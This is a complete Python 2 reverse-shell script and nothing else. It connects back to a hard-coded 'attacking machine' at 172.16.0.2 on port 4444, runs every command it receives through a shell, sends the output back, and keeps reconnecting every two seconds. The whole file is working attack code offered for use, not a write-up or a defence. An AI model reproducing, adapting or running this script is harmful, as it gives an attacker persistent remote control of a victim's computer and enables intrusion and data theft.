import socket
import subprocess
import sys
import time

HOST = '172.16.0.2'    # Your attacking machine to connect back to
PORT = 4444           # The port your attacking machine is listening on

def connect((host, port)):
   go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   go.connect((host, port))
   return go

def wait(go):
   data = go.recv(1024)
   if data == "exit\n":
      go.close()
      sys.exit(0)
   elif len(data)==0:
      return True
   else:
      p = subprocess.Popen(data, shell=True,
         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
         stdin=subprocess.PIPE)
      stdout = p.stdout.read() + p.stderr.read()
      go.send(stdout)
      return False

def main():
   while True:
      dead=False
      try:
         go=connect((HOST,PORT))
         while not dead:
            dead=wait(go)
         go.close()
      except socket.error:
         pass
      time.sleep(2)

if __name__ == "__main__":
   sys.exit(main())
